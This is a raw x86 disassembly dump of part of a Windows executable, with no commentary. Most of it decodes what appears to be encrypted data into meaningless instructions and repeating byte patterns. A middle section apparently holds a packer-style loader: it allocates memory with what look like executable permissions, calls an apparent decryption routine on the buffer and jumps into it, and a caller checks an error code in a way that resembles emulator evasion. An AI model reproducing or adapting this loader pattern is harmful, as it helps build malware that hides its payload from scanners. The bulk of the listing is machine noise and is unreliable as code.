  4213a0:	adc    ebp,ecx
  4213a2:	jbe    0x42140d
  4213a4:	ja     0x421387
  4213a6:	pop    gs
  4213a8:	adc    dl,BYTE PTR [edx-0x5e]
  4213ab:	js     0x421393
  4213ad:	pop    ebp
  4213ae:	jbe    0x4213c9
  4213b0:	leave  
  4213b1:	gs cli 
  4213b3:	adc    ch,BYTE PTR [esi+0x79]
  4213b6:	add    ch,cl
  4213b8:	aam    0x2d
  4213ba:	push   ebx
  4213bb:	mov    ebx,0x232cd87f
  4213c0:	leave  
  4213c1:	xchg   BYTE PTR [edx+0xa],ch
  4213c4:	int3   
  4213c5:	mov    bl,0x1c
  4213c7:	ret    
  4213c8:	mov    esp,0xe4aecf1a
  4213cd:	jns    0x42140b
  4213cf:	test   eax,0x65972357
  4213d4:	fistp  DWORD PTR [esi+0x28]
  4213d7:	addr16 sbb ebx,eax
  4213da:	aad    0xbc
  4213dc:	int    0xd0
  4213de:	jns    0x4213e1
  4213e0:	push   es
  4213e1:	and    ch,BYTE PTR es:[eax]
  4213e4:	(bad)  ds:0x175781ed
  4213ea:	xchg   DWORD PTR [edx],ebp
  4213ec:	sub    BYTE PTR [eax+edi*8-0x5c],bl
  4213f0:	loope  0x42140f
  4213f2:	xor    dh,bl
  4213f4:	xchg   edi,eax
  4213f5:	shl    DWORD PTR [esi],cl
  4213f7:	retf   0x8376
  4213fa:	ror    DWORD PTR [ebx+ecx*4],cl
  4213fd:	int3   
  4213fe:	sub    dh,0xf0
  421401:	test   BYTE PTR [ecx-0x15165263],bh
  421407:	jecxz  0x4213ee
  421409:	push   DWORD PTR [edi+ebp*8+0x5d]
  42140d:	sub    edi,esp
  42140f:	aam    0x49
  421411:	addr16 jns 0x421486
  421414:	pop    ebp
  421415:	jo     0x4213e7
  421417:	jl     0x421468
  421419:	lods   eax,DWORD PTR ds:[esi]
  42141a:	ret    0xb62b
  42141d:	mov    ebx,0x1b319f68
  421422:	(bad)  
  421423:	jns    0x42149b
  421425:	js     0x421409
  421427:	add    edi,ebx
  421429:	iret   
  42142a:	add    DWORD PTR [ebx],edx
  42142c:	cmp    DWORD PTR [ecx],ebp
  42142e:	rol    DWORD PTR [eax],0xff
  421431:	cmc    
  421432:	sub    BYTE PTR [esi+0x42],ah
  421435:	sbb    DWORD PTR [eax+edi*1-0x1071cde1],0xaa225360
  421440:	cli    
  421441:	cwde   
  421442:	push   ecx
  421443:	lahf   
  421444:	xchg   esi,eax
  421445:	fsub   QWORD PTR [esi-0x1c]
  421448:	or     edi,DWORD PTR [edx-0x44]
  42144b:	fidiv  DWORD PTR [edi-0x6c]
  42144e:	mov    gs,WORD PTR [edi+0x31]
  421451:	aas    
  421452:	sbb    ch,BYTE PTR [edx-0x1]
  421455:	mov    edx,0xd8778c4c
  42145a:	dec    ebx
  42145b:	cli    
  42145c:	clc    
  42145d:	fcomp  QWORD PTR [edi]
  42145f:	cmp    BYTE PTR ds:0x8e0c116f,bl
  421465:	aam    0xe8
  421467:	idiv   DWORD PTR [ecx-0x6d]
  42146a:	jbe    0x421427
  42146c:	nop
  42146d:	bound  ecx,QWORD PTR [ebx+ebx*4]
  421470:	sub    al,0x96
  421472:	dec    edi
  421473:	cmp    BYTE PTR [ecx-0x5d3fbc],ch
  421479:	mov    ah,0xc9
  42147b:	xor    eax,0x9eac15e4
  421480:	jmp    0x237f:0xa26dc95
  421487:	xlat   BYTE PTR ds:[ebx]
  421488:	shr    ebp,cl
  42148a:	mov    ecx,0x58f66ac
  42148f:	loope  0x421467
  421491:	stos   DWORD PTR es:[edi],eax
  421492:	jno    0x4214f4
  421494:	shl    ebp,cl
  421496:	mov    dh,0x5d
  421498:	jb     0x4214ac
  42149a:	jp     0x421509
  42149c:	sub    al,0x76
  42149e:	push   ecx
  42149f:	stos   DWORD PTR es:[edi],eax
  4214a0:	mov    ds:0xdc8f55e4,eax
  4214a5:	push   edi
  4214a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a7:	pop    esi
  4214a8:	jne    0x4214e9
  4214aa:	rcl    edx,1
  4214ac:	and    eax,0x917532f4
  4214b1:	dec    edi
  4214b2:	xor    DWORD PTR [eax-0x55dd4fa9],0xffffff88
  4214b9:	inc    ecx
  4214ba:	les    edx,FWORD PTR [ecx-0x3d7de52c]
  4214c0:	mov    DWORD PTR [edi-0x60ccf64f],esp
  4214c6:	int    0xf9
  4214c8:	inc    ebp
  4214c9:	jb     0x4214b8
  4214cb:	shl    edi,cl
  4214cd:	in     eax,0x3
  4214cf:	and    dh,BYTE PTR [edi-0x5d1955e1]
  4214d5:	stos   BYTE PTR es:[edi],al
  4214d6:	xor    dl,bh
  4214d8:	dec    ebp
  4214d9:	nop    DWORD PTR [edx]
  4214dc:	sub    BYTE PTR [eax-0x595ca065],0x9
  4214e3:	jle    0x42148f
  4214e5:	xor    cx,WORD PTR cs:[edi-0x38eaaa3d]
  4214ed:	dec    eax
  4214ee:	push   0xffffffc9
  4214f0:	fdivr  DWORD PTR [ecx-0x5d73822c]
  4214f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214f7:	loopne 0x421571
  4214f9:	and    edi,ebp
  4214fb:	imul   BYTE PTR [esi-0x23f0284d]
  421501:	xchg   esp,eax
  421502:	mov    ch,dl
  421504:	daa    
  421505:	cdq    
  421506:	add    al,BYTE PTR [ebx-0x4c992d3f]
  42150c:	mov    ah,bl
  42150e:	sbb    cl,dh
  421510:	aas    
  421511:	call   0xeacbd35e
  421516:	bound  ecx,QWORD PTR [ecx+0x50]
  421519:	jmp    FWORD PTR [bp+di+0x59]
  42151d:	and    esi,ecx
  42151f:	mov    ds:0x25b016e8,al
  421524:	push   edi
  421525:	(bad)  
  421526:	fs hlt 
  421528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421529:	repz iret 
  42152b:	inc    edx
  42152c:	add    ebp,eax
  42152e:	bound  esi,QWORD PTR [edi-0x42]
  421531:	repnz push edx
  421533:	loope  0x421508
  421535:	sar    BYTE PTR [ebx+0x44],0x44
  421539:	(bad)  
  42153b:	mov    ebx,0xb35eb7b4
  421540:	fisubr WORD PTR [eax+eiz*8]
  421543:	pop    esi
  421544:	pop    ebp
  421545:	pop    ecx
  421546:	ret    
  421547:	nop
  421548:	nop
  421549:	nop
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x70
  421556:	mov    DWORD PTR [ebp-0x30],0x0
  42155d:	mov    DWORD PTR [ebp-0x70],0x0
  421564:	mov    DWORD PTR [ebp-0x58],0x0
  42156b:	mov    DWORD PTR [ebp-0x60],0x0
  421572:	mov    DWORD PTR [ebp-0x4c],0x0
  421579:	mov    DWORD PTR [ebp-0x8],0x0
  421580:	mov    DWORD PTR [ebp-0x18],0x0
  421587:	mov    DWORD PTR [ebp-0x48],0x0
  42158e:	mov    DWORD PTR [ebp-0x10],0x0
  421595:	mov    DWORD PTR [ebp-0x6c],0x0
  42159c:	mov    DWORD PTR [ebp-0x54],0x0
  4215a3:	mov    DWORD PTR [ebp-0x4],0x0
  4215aa:	mov    DWORD PTR [ebp-0x2c],0x0
  4215b1:	mov    DWORD PTR [ebp-0x50],0x0
  4215b8:	mov    DWORD PTR [ebp-0x68],0x0
  4215bf:	mov    DWORD PTR [ebp-0xc],0x0
  4215c6:	mov    DWORD PTR [ebp-0x5c],0x0
  4215cd:	mov    DWORD PTR [ebp-0x14],0x0
  4215d4:	mov    eax,ds:0x428150
  4215d9:	mov    DWORD PTR [ebp-0x28],eax
  4215dc:	mov    ecx,DWORD PTR ds:0x428154
  4215e2:	mov    DWORD PTR [ebp-0x24],ecx
  4215e5:	mov    edx,DWORD PTR ds:0x428158
  4215eb:	mov    DWORD PTR [ebp-0x20],edx
  4215ee:	mov    al,ds:0x42815c
  4215f3:	mov    BYTE PTR [ebp-0x1c],al
  4215f6:	mov    ecx,DWORD PTR ds:0x428140
  4215fc:	mov    DWORD PTR [ebp-0x40],ecx
  4215ff:	mov    edx,DWORD PTR ds:0x428144
  421605:	mov    DWORD PTR [ebp-0x3c],edx
  421608:	mov    eax,ds:0x428148
  42160d:	mov    DWORD PTR [ebp-0x38],eax
  421610:	mov    cx,WORD PTR ds:0x42814c
  421617:	mov    WORD PTR [ebp-0x34],cx
  42161b:	mov    dl,BYTE PTR ds:0x42814e
  421621:	mov    BYTE PTR [ebp-0x32],dl
  421624:	mov    DWORD PTR [ebp-0x2c],0x40
  42162b:	mov    eax,DWORD PTR [ebp-0x60]
  42162e:	push   eax
  42162f:	push   0x0
  421631:	push   0x0
  421633:	mov    ecx,DWORD PTR [ebp-0x68]
  421636:	push   ecx
  421637:	call   0x422a10
  42163c:	lea    edx,[ebp-0xc]
  42163f:	push   edx
  421640:	lea    eax,[ebp-0xc]
  421643:	push   eax
  421644:	lea    ecx,[ebp-0x14]
  421647:	push   ecx
  421648:	call   DWORD PTR ds:0x428004
  42164e:	test   eax,eax
  421650:	je     0x42166b
  421652:	mov    edx,DWORD PTR [ebp-0x60]
  421655:	push   edx
  421656:	push   0x8
  421658:	mov    eax,DWORD PTR [ebp-0x68]
  42165b:	push   eax
  42165c:	call   DWORD PTR ds:0x428030
  421662:	mov    ecx,DWORD PTR [ebp-0xc]
  421665:	add    ecx,0x1
  421668:	mov    DWORD PTR [ebp-0xc],ecx
  42166b:	push   0x0
  42166d:	push   0x0
  42166f:	push   0x0
  421671:	call   DWORD PTR ds:0x428000
  421677:	mov    BYTE PTR [ebp-0x40],0x56
  42167b:	call   DWORD PTR ds:0x42803c
  421681:	mov    DWORD PTR [ebp-0x30],eax
  421684:	mov    BYTE PTR [ebp-0x3e],0x72
  421688:	movzx  edx,WORD PTR [ebp-0x30]
  42168c:	test   edx,edx
  42168e:	jne    0x4216e0
  421690:	mov    BYTE PTR [ebp-0x34],0x0
  421694:	mov    DWORD PTR [ebp-0x14],0xe0d
  42169b:	lea    eax,[ebp-0x28]
  42169e:	push   eax
  42169f:	call   DWORD PTR ds:0x428044
  4216a5:	mov    DWORD PTR [ebp-0x60],eax
  4216a8:	mov    DWORD PTR [ebp-0x58],0x3a
  4216af:	lea    ecx,[ebp-0x40]
  4216b2:	push   ecx
  4216b3:	mov    edx,DWORD PTR [ebp-0x60]
  4216b6:	push   edx
  4216b7:	call   DWORD PTR ds:0x428040
  4216bd:	mov    DWORD PTR [ebp-0x44],eax
  4216c0:	mov    DWORD PTR [ebp-0x4],0x3701aac
  4216c7:	push   0x3
  4216c9:	push   0x0
  4216cb:	push   0x0
  4216cd:	mov    eax,DWORD PTR [ebp-0x68]
  4216d0:	push   eax
  4216d1:	call   DWORD PTR ds:0x42812c
  4216d7:	mov    DWORD PTR [ebp-0x6c],0x10e7cf
  4216de:	jmp    0x421701
  4216e0:	mov    BYTE PTR ds:0x445fe8,0x0
  4216e7:	mov    BYTE PTR ds:0x42d1f0,0x0
  4216ee:	push   0x0
  4216f0:	mov    ecx,DWORD PTR [ebp-0x60]
  4216f3:	push   ecx
  4216f4:	call   DWORD PTR ds:0x42800c
  4216fa:	mov    BYTE PTR ds:0x4439a8,0x0
  421701:	push   DWORD PTR [ebp-0x2c]
  421704:	push   0x1000
  421709:	mov    eax,DWORD PTR [ebp-0x14]
  42170c:	add    eax,0x23
  42170f:	add    eax,0x23
  421712:	push   eax
  421713:	xor    eax,eax
  421715:	push   eax
  421716:	mov    ecx,DWORD PTR [ebp-0x44]
  421719:	call   ecx
  42171b:	mov    edx,eax
  42171d:	mov    DWORD PTR [ebp-0x8],edx
  421720:	mov    edx,DWORD PTR [ebp-0x6c]
  421723:	sub    edx,0xdae0b
  421729:	mov    DWORD PTR [ebp-0x6c],edx
  42172c:	cmp    DWORD PTR [ebp-0x8],0x0
  421730:	jne    0x42174d
  421732:	mov    eax,DWORD PTR [ebp-0x68]
  421735:	push   eax
  421736:	push   0x0
  421738:	mov    ecx,DWORD PTR [ebp-0x60]
  42173b:	push   ecx
  42173c:	push   0x1
  42173e:	push   0x0
  421740:	call   DWORD PTR ds:0x428120
  421746:	mov    BYTE PTR ds:0x4439a8,0x0
  42174d:	mov    edx,DWORD PTR [ebp-0x8]
  421750:	add    edx,DWORD PTR [ebp-0x14]
  421753:	mov    eax,DWORD PTR [ebp-0x4]
  421756:	mov    DWORD PTR [edx],eax
  421758:	mov    DWORD PTR [ebp-0x30],0x410000
  42175f:	mov    ecx,DWORD PTR [ebp-0x60]
  421762:	push   ecx
  421763:	call   DWORD PTR ds:0x428048
  421769:	call   DWORD PTR ds:0x428130
  42176f:	push   DWORD PTR ds:0x428044
  421775:	pop    edx
  421776:	mov    DWORD PTR [ebp-0x70],edx
  421779:	mov    edx,DWORD PTR [ebp-0x8]
  42177c:	add    edx,DWORD PTR [ebp-0x58]
  42177f:	mov    DWORD PTR [ebp-0x5c],edx
  421782:	mov    eax,ds:0x428040
  421787:	mov    DWORD PTR [ebp-0x4c],eax
  42178a:	mov    ecx,DWORD PTR [ebp-0x8]
  42178d:	add    ecx,DWORD PTR [ebp-0x14]
  421790:	mov    edx,DWORD PTR [ebp+0x8]
  421793:	mov    DWORD PTR [ecx+0x4],edx
  421796:	mov    eax,DWORD PTR [ebp-0x8]
  421799:	add    eax,DWORD PTR [ebp-0x14]
  42179c:	mov    DWORD PTR [ebp-0x10],eax
  42179f:	mov    ecx,DWORD PTR [ebp-0x68]
  4217a2:	push   ecx
  4217a3:	call   DWORD PTR ds:0x428050
  4217a9:	cmp    DWORD PTR [ebp-0x6c],0x0
  4217ad:	jbe    0x4217ca
  4217af:	mov    edx,DWORD PTR [ebp-0x10]
  4217b2:	push   edx
  4217b3:	mov    eax,DWORD PTR [ebp-0x14]
  4217b6:	push   eax
  4217b7:	mov    ecx,DWORD PTR [ebp-0x30]
  4217ba:	add    ecx,DWORD PTR [ebp-0x6c]
  4217bd:	push   ecx
  4217be:	mov    edx,DWORD PTR [ebp-0x8]
  4217c1:	push   edx
  4217c2:	call   0x411000
  4217c7:	add    esp,0x10
  4217ca:	cmp    DWORD PTR [ebp-0x5c],0x0
  4217ce:	je     0x4217de
  4217d0:	push   DWORD PTR [ebp-0x4c]
  4217d3:	push   DWORD PTR [ebp-0x70]
  4217d6:	mov    edx,DWORD PTR [ebp-0x5c]
  4217d9:	push   eax
  4217da:	jmp    edx
  4217dc:	jmp    0x4217e4
  4217de:	mov    eax,DWORD PTR [ebp+0x8]
  4217e1:	mov    DWORD PTR [ebp-0x18],eax
  4217e4:	mov    eax,0x1
  4217e9:	mov    esp,ebp
  4217eb:	pop    ebp
  4217ec:	ret    
  4217ed:	int3   
  4217ee:	int3   
  4217ef:	int3   
  4217f0:	push   ebp
  4217f1:	mov    ebp,esp
  4217f3:	sub    esp,0x8
  4217f6:	push   esi
  4217f7:	push   0xa
  4217f9:	mov    DWORD PTR [ebp-0x4],0x0
  421800:	call   DWORD PTR ds:0x428028
  421806:	mov    esi,DWORD PTR ds:0x42803c
  42180c:	push   0xa
  42180e:	push   0xa
  421810:	push   0x0
  421812:	mov    DWORD PTR [ebp-0x8],esi
  421815:	call   DWORD PTR ds:0x428010
  42181b:	test   esi,esi
  42181d:	jne    0x421829
  42181f:	push   0xa
  421821:	push   esi
  421822:	push   esi
  421823:	call   DWORD PTR ds:0x428024
  421829:	call   DWORD PTR ds:0x428020
  42182f:	push   0x0
  421831:	push   0x4e
  421833:	push   0x1e
  421835:	push   0x0
  421837:	push   0xffffffff
  421839:	call   DWORD PTR ds:0x42801c
  42183f:	test   eax,eax
  421841:	je     0x421852
  421843:	push   0x0
  421845:	push   0x1
  421847:	push   0x0
  421849:	call   DWORD PTR ds:0x428018
  42184f:	mov    DWORD PTR [ebp-0x4],eax
  421852:	mov    esi,DWORD PTR [ebp-0x8]
  421855:	call   esi
  421857:	mov    DWORD PTR [ebp-0x4],eax
  42185a:	cmp    DWORD PTR [ebp-0x4],0x57
  42185e:	jne    0x421879
  421860:	push   0x89ed6ae
  421865:	call   0x421550
  42186a:	add    esp,0x4
  42186d:	push   0x1
  42186f:	push   0x0
  421871:	push   0x0
  421873:	call   DWORD PTR ds:0x428128
  421879:	xor    eax,eax
  42187b:	pop    esi
  42187c:	mov    esp,ebp
  42187e:	pop    ebp
  42187f:	ret    
  421880:	sub    esp,0x10
  421883:	push   0x0
  421885:	push   0x0
  421887:	call   DWORD PTR ds:0x428034
  42188d:	lea    eax,[esp+0x0]
  421891:	push   eax
  421892:	call   DWORD PTR ds:0x42804c
  421898:	push   0xa
  42189a:	call   DWORD PTR ds:0x428028
  4218a0:	cmp    WORD PTR [esp+0x0],0x0
  4218a6:	je     0x4218c4
  4218a8:	push   0x0
  4218aa:	push   0x0
  4218ac:	push   0x0
  4218ae:	push   0x0
  4218b0:	call   0x422a10
  4218b5:	push   0x0
  4218b7:	call   0x4217f0
  4218bc:	add    esp,0x4
  4218bf:	jmp    0x4229f1
  4218c4:	inc    DWORD PTR [esp+eiz*2+0x3e]
  4218c8:	xor    al,0x93
  4218ca:	loop   0x421912
  4218cc:	mov    ebp,0xa08b4b00
  4218d1:	mov    esp,0x8cae3ef6
  4218d6:	nop
  4218d7:	loop   0x42191f
  4218d9:	mov    ebp,0xe08b4b04
  4218de:	inc    ebx
  4218df:	or     DWORD PTR [esi],edi
  4218e1:	scas   al,BYTE PTR es:[edi]
  4218e2:	xor    al,0x90
  4218e4:	loop   0x42192c
  4218e6:	mov    ebp,0xa08b4b04
  4218eb:	inc    ebx
  4218ec:	or     DWORD PTR [esi],edi
  4218ee:	scas   al,BYTE PTR es:[edi]
  4218ef:	xor    al,0x90
  4218f1:	loop   0x421939
  4218f3:	mov    ebp,0xa08b4b04
  4218f8:	inc    ebx
  4218f9:	or     DWORD PTR [esi],edi
  4218fb:	scas   al,BYTE PTR es:[edi]
  4218fc:	xor    al,0x90
  4218fe:	loop   0x421946
  421900:	mov    ebp,0xa08b4bfc
  421905:	dec    ebp
  421906:	push   ss
  421907:	test   BYTE PTR [eax-0x7414dbcc],ah
  42190d:	pushf  
  42190e:	mov    esp,0x626dc74a
  421913:	pop    ebp
  421914:	push   esi
  421915:	mov    DWORD PTR [edi-0x50],0x63d23492
  42191c:	cmp    edx,ebp
  42191e:	int    0x63
  421920:	push   0x5f
  421922:	rcr    BYTE PTR [edx-0x1],0x96
  421926:	data16 fbld TBYTE PTR [ecx+0x6b]
  42192a:	stc    
  42192b:	aad    0x2d
  42192d:	sub    DWORD PTR [edi-0x40],edx
  421930:	adc    al,0xd4
  421932:	lods   eax,DWORD PTR ds:[esi]
  421933:	adc    eax,0xef24699d
  421938:	lds    ebp,FWORD PTR [ebp+0x4]
  42193b:	xor    esp,DWORD PTR [eax+edx*1-0x42b91d70]
  421942:	add    al,0x4b
  421944:	mov    esp,DWORD PTR [edi-0x12980a26]
  42194a:	int3   
  42194b:	add    ch,al
  42194d:	add    eax,0xc8419645
  421952:	pop    eax
  421953:	rol    DWORD PTR [ebx],1
  421955:	retfw  
  421957:	cmp    BYTE PTR [edx+0xe2fbebd],bl
  42195d:	adc    ebp,esi
  42195f:	cwde   
  421960:	dec    ecx
  421961:	retf   
  421962:	(bad)  
  421963:	cmp    al,0x3e
  421965:	enter  0x7f87,0xb7
  421969:	ins    BYTE PTR es:[edi],dx
  42196a:	mov    bl,0x19
  42196c:	stos   BYTE PTR es:[edi],al
  42196d:	outs   dx,DWORD PTR ds:[esi]
  42196e:	xchg   DWORD PTR [edi],eax
  421970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421971:	jb     0x4219db
  421973:	jo     0x4219c1
  421975:	test   DWORD PTR [edx+ebx*2-0x6444157f],0x91b4e434
  421980:	call   0x41d85ea3
  421985:	enter  0xd058,0x3
  421989:	push   ss
  42198a:	push   edi
  42198b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42198c:	call   0x7306:0xe3d9e5d
  421993:	xor    cl,BYTE PTR [ecx+0x51]
  421996:	pop    ebx
  421997:	xchg   ebx,eax
  421998:	ds cwde 
  42199a:	sbb    dl,ah
  42199c:	mov    bh,0x5c
  42199e:	sub    DWORD PTR cs:[edx-0x5b530eff],0x6c
  4219a6:	cmc    
  4219a7:	in     eax,dx
  4219a8:	dec    esp
  4219a9:	(bad)  
  4219aa:	cld    
  4219ab:	fld    DWORD PTR [ecx+0x566a2af2]
  4219b1:	in     eax,dx
  4219b2:	int3   
  4219b3:	add    ch,al
  4219b5:	inc    esi
  4219b6:	mov    ebp,0xa08b4b04
  4219bb:	inc    ebx
  4219bc:	or     DWORD PTR [esi-0x15],ebp
  4219bf:	xor    al,0x90
  4219c1:	scas   al,BYTE PTR es:[edi]
  4219c2:	inc    edi
  4219c3:	mov    edi,0xff68a704
  4219c8:	or     al,0x9
  4219ca:	ds scas al,BYTE PTR es:[edi]
  4219cc:	xor    al,0x90
  4219ce:	loop   0x421a16
  4219d0:	mov    ebp,0xa1884be4
  4219d5:	dec    eax
  4219d6:	or     BYTE PTR [esi+ebp*4],dh
  4219d9:	xor    al,0x7c
  4219db:	out    0x46,al
  4219dd:	mov    ebp,0xa08b4d00
  4219e2:	inc    ebx
  4219e3:	or     DWORD PTR [esi],edi
  4219e5:	scas   eax,DWORD PTR es:[edi]
  4219e6:	mov    DWORD PTR [eax+0x4ad46e2],edx
  4219ec:	dec    ebx
  4219ed:	mov    esp,DWORD PTR [eax-0x51c1f6ba]
  4219f3:	jne    0x421985
  4219f5:	loop   0x421a4d
  4219f7:	mov    ebp,0xa0894b04
  4219fc:	inc    ebx
  4219fd:	or     al,0x3e
  4219ff:	scas   eax,DWORD PTR es:[edi]
  421a00:	xor    al,0x90
  421a02:	loop   0x421a4a
  421a04:	mov    ebp,0xa08a4b01
  421a09:	inc    ebx
  421a0a:	or     DWORD PTR [esi],edi
  421a0c:	scas   al,BYTE PTR es:[edi]
  421a0d:	xor    al,0x10
  421a0f:	jmp    0x4b42d75a
  421a14:	mov    ebx,DWORD PTR ds:0xac3e0c72
  421a1a:	xor    al,0x90
  421a1c:	bound  eax,QWORD PTR [esi-0x43]
  421a1f:	adc    al,0x4b
  421a21:	mov    esi,DWORD PTR [eax-0x51c1f6bd]
  421a27:	and    al,0x90
  421a29:	loop   0x421a81
  421a2b:	mov    ebp,0xa08b4b04
  421a30:	inc    ebx
  421a31:	sbb    DWORD PTR [esi],edi
  421a33:	scas   al,BYTE PTR es:[edi]
  421a34:	xor    al,0x90
  421a36:	loop   0x421a7e
  421a38:	mov    ebp,0xa08b4b04
  421a3d:	(bad)  
  421a3e:	addr16 xor eax,0xe2935dae
  421a44:	inc    esi
  421a45:	mov    ebp,0x6f8b4034
  421a4a:	jle    0x421a55
  421a4c:	ds scas al,BYTE PTR es:[edi]
  421a4e:	xor    al,0x90
  421a50:	loop   0x421a98
  421a52:	mov    ebp,0xa08b4b04
  421a57:	inc    ebx
  421a58:	or     DWORD PTR [esi],edi
  421a5a:	scas   al,BYTE PTR es:[edi]
  421a5b:	xor    al,0x90
  421a5d:	loop   0x421aa5
  421a5f:	mov    ebp,0xa08b4b04
  421a64:	inc    ebx
  421a65:	or     DWORD PTR [esi],edi
  421a67:	scas   al,BYTE PTR es:[edi]
  421a68:	xor    al,0x90
  421a6a:	loop   0x421ab2
  421a6c:	mov    ebp,0xa08b4b04
  421a71:	inc    ebx
  421a72:	or     DWORD PTR [esi],edi
  421a74:	scas   al,BYTE PTR es:[edi]
  421a75:	xor    al,0x90
  421a77:	loop   0x421abf
  421a79:	mov    ebp,0xa08b4b04
  421a7e:	inc    ebx
  421a7f:	or     DWORD PTR [esi],edi
  421a81:	scas   al,BYTE PTR es:[edi]
  421a82:	xor    al,0x90
  421a84:	loop   0x421acc
  421a86:	mov    ebp,0xa08b4b04
  421a8b:	inc    ebx
  421a8c:	or     DWORD PTR [esi],edi
  421a8e:	scas   al,BYTE PTR es:[edi]
  421a8f:	xor    al,0x90
  421a91:	loop   0x421ad9
  421a93:	mov    ebp,0xa08b4b04
  421a98:	inc    ebx
  421a99:	or     DWORD PTR [esi],edi
  421a9b:	scas   al,BYTE PTR es:[edi]
  421a9c:	xor    al,0x90
  421a9e:	loop   0x421ae6
  421aa0:	mov    ebp,0xa08b4b04
  421aa5:	inc    ebx
  421aa6:	or     DWORD PTR [esi],edi
  421aa8:	scas   al,BYTE PTR es:[edi]
  421aa9:	xor    al,0x90
  421aab:	loop   0x421af3
  421aad:	mov    ebp,0xa08b4b04
  421ab2:	inc    ebx
  421ab3:	or     DWORD PTR [esi],edi
  421ab5:	add    BYTE PTR [eax-0xb],0x9a
  421ab9:	xor    bh,BYTE PTR [ebp-0x7f74b4fc]
  421abf:	dec    eax
  421ac0:	or     DWORD PTR [esi],edi
  421ac2:	mov    esi,0x7ce29034
  421ac7:	mov    ecx,0xa08f4b04
  421acc:	inc    ebx
  421acd:	pop    ecx
  421ace:	jnp    0x421abd
  421ad0:	push   es
  421ad1:	les    ebp,FWORD PTR [ebp+0x4b04bd46]
  421ad7:	mov    esp,DWORD PTR [eax+0x4e3e0963]
  421add:	sbb    ah,dl
  421adf:	xchg   ecx,eax
  421ae0:	xor    al,0xde
  421ae2:	add    al,0x4b
  421ae4:	mov    esp,DWORD PTR [eax-0x51c1f6ed]
  421aea:	add    al,0x9b
  421aec:	loop   0x421b34
  421aee:	in     eax,dx
  421aef:	add    al,0x4b
  421af1:	mov    ebx,DWORD PTR [esi-0x51c1f6b9]
  421af7:	xor    al,0x90
  421af9:	loop   0x421b41
  421afb:	mov    ebp,0xa08b4b04
  421b00:	inc    ebx
  421b01:	sub    DWORD PTR [esi],edi
  421b03:	scas   al,BYTE PTR es:[edi]
  421b04:	aam    0x90
  421b06:	loop   0x421b4e
  421b08:	mov    ebp,0xa08b4b04
  421b0d:	inc    ebx
  421b0e:	or     DWORD PTR [esi],edi
  421b10:	scas   al,BYTE PTR es:[edi]
  421b11:	xor    al,0x90
  421b13:	loop   0x421b5b
  421b15:	mov    ebp,0xa08b4b04
  421b1a:	inc    ebx
  421b1b:	or     DWORD PTR [esi],edi
  421b1d:	scas   al,BYTE PTR es:[edi]
  421b1e:	xor    al,0x90
  421b20:	loop   0x421b68
  421b22:	mov    ebp,0xa08b4b04
  421b27:	inc    ebx
  421b28:	or     DWORD PTR [esi],edi
  421b2a:	scas   al,BYTE PTR es:[edi]
  421b2b:	xor    al,0x90
  421b2d:	loop   0x421b75
  421b2f:	mov    ebp,0xa08b4b04
  421b34:	inc    ebx
  421b35:	or     DWORD PTR [esi],edi
  421b37:	scas   al,BYTE PTR es:[edi]
  421b38:	xor    al,0x90
  421b3a:	loop   0x421b82
  421b3c:	mov    ebp,0xa08b4b04
  421b41:	inc    ebx
  421b42:	or     DWORD PTR [esi],edi
  421b44:	scas   al,BYTE PTR es:[edi]
  421b45:	xor    al,0x90
  421b47:	loop   0x421b8f
  421b49:	mov    ebp,0xa08b4b04
  421b4e:	inc    ebx
  421b4f:	or     DWORD PTR [esi],edi
  421b51:	scas   al,BYTE PTR es:[edi]
  421b52:	xor    al,0x90
  421b54:	loop   0x421b9c
  421b56:	mov    ebp,0xa08b4b04
  421b5b:	inc    ebx
  421b5c:	or     DWORD PTR [esi],edi
  421b5e:	scas   al,BYTE PTR es:[edi]
  421b5f:	xor    al,0x90
  421b61:	loop   0x421ba9
  421b63:	mov    ebp,0xa08b4b04
  421b68:	inc    ebx
  421b69:	or     DWORD PTR [esi],edi
  421b6b:	scas   al,BYTE PTR es:[edi]
  421b6c:	xor    al,0x90
  421b6e:	loop   0x421bb6
  421b70:	mov    ebp,0xa08b4b04
  421b75:	inc    ebx
  421b76:	or     DWORD PTR [esi],edi
  421b78:	scas   al,BYTE PTR es:[edi]
  421b79:	xor    al,0x90
  421b7b:	loop   0x421bc3
  421b7d:	mov    ebp,0xa08b4b04
  421b82:	inc    ebx
  421b83:	or     DWORD PTR [esi],edi
  421b85:	scas   al,BYTE PTR es:[edi]
  421b86:	xor    al,0x90
  421b88:	loop   0x421bd0
  421b8a:	mov    ebp,0xa08b4b04
  421b8f:	inc    ebx
  421b90:	or     DWORD PTR [esi],edi
  421b92:	scas   al,BYTE PTR es:[edi]
  421b93:	xor    al,0x90
  421b95:	loop   0x421bdd
  421b97:	mov    ebp,0xa08b4b04
  421b9c:	inc    ebx
  421b9d:	or     DWORD PTR [esi],edi
  421b9f:	scas   al,BYTE PTR es:[edi]
  421ba0:	xor    al,0x90
  421ba2:	loop   0x421bea
  421ba4:	mov    ebp,0xa08b4b04
  421ba9:	inc    ebx
  421baa:	or     DWORD PTR [esi],edi
  421bac:	scas   al,BYTE PTR es:[edi]
  421bad:	xor    al,0x90
  421baf:	loop   0x421bf7
  421bb1:	mov    ebp,0xa08b4b04
  421bb6:	inc    ebx
  421bb7:	or     DWORD PTR [esi],edi
  421bb9:	scas   al,BYTE PTR es:[edi]
  421bba:	xor    al,0x90
  421bbc:	loop   0x421c04
  421bbe:	mov    ebp,0xa08b4b04
  421bc3:	inc    ebx
  421bc4:	or     DWORD PTR [esi],edi
  421bc6:	scas   al,BYTE PTR es:[edi]
  421bc7:	xor    al,0x90
  421bc9:	loop   0x421c11
  421bcb:	mov    ebp,0xa08b4b04
  421bd0:	inc    ebx
  421bd1:	or     DWORD PTR [esi],edi
  421bd3:	scas   al,BYTE PTR es:[edi]
  421bd4:	xor    al,0x90
  421bd6:	loop   0x421c1e
  421bd8:	mov    ebp,0xa08b4b04
  421bdd:	inc    ebx
  421bde:	or     DWORD PTR [esi],edi
  421be0:	scas   al,BYTE PTR es:[edi]
  421be1:	xor    al,0x90
  421be3:	loop   0x421c2b
  421be5:	mov    ebp,0xa08b4b04
